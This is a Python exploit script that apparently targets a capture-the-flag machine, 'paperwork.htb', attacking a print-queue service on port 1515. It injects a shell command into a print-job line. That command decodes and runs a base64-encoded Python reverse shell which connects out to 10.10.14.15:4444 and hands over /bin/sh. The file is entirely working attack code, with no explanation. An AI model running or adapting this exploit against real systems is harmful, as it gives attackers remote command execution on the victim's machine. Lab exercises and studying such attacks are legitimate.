#!/usr/bin/env python3
import socket
import base64
import time

HOST = "paperwork.htb"
PORT = 1515
QUEUE = "archive_intake"

# ------------------------------
# Choose one of the following:
# ------------------------------

# 1. Reverse shell (Python3) – recommended
PY_CODE = '''import socket,subprocess,os
s=socket.socket()
s.connect(('10.10.14.15',4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(['/bin/sh'])
'''
b64 = base64.b64encode(PY_CODE.encode()).decode()
CMD = f"python3 -c \"exec(__import__('base64').b64decode('{b64}'))\""

# 2. Simple test – sleep 10 seconds (uncomment to verify injection)
# CMD = "sleep 10"

# ------------------------------

def recv_ack(sock, timeout=2):
    sock.settimeout(timeout)
    try:
        data = sock.recv(1)
        if not data:
            print("[-] Connection closed")
            return False
        print(f"[+] ACK: {data.hex()}")
        return data == b"\x00"
    except socket.timeout:
        print("[-] Timeout waiting for ACK")
        return False
    finally:
        sock.settimeout(None)

# Build payload
payload_line = f"J'; {CMD}; echo '".encode()
content = payload_line + b"\n"
size = len(content) - 1          # server reads size+1 bytes

with socket.create_connection((HOST, PORT)) as s:
    print("[+] Connected")

    # Send print job command + queue
    s.sendall(b"\x02" + QUEUE.encode() + b"\n")
    if not recv_ack(s):
        exit(1)
    print("[+] Queue accepted")

    # Send malicious chunk (subcommand 2 + size)
    chunk = b"\x02 " + str(size).encode() + b"\n"
    s.sendall(chunk)

    # Read ACK for the subcommand
    if not recv_ack(s):
        exit(1)
    print("[+] Subcommand ACK received")

    # Send the payload content
    s.sendall(content)
    print("[+] Payload sent")

    # Read the two remaining ACKs (processing of the job)
    start = time.time()
    if not recv_ack(s):
        exit(1)
    print(f"[+] Processing ACK 1 (elapsed: {time.time()-start:.2f}s)")
    if not recv_ack(s):
        exit(1)
    print(f"[+] Processing ACK 2 (elapsed: {time.time()-start:.2f}s)")

    print("[*] Done. Check your reverse shell listener.")
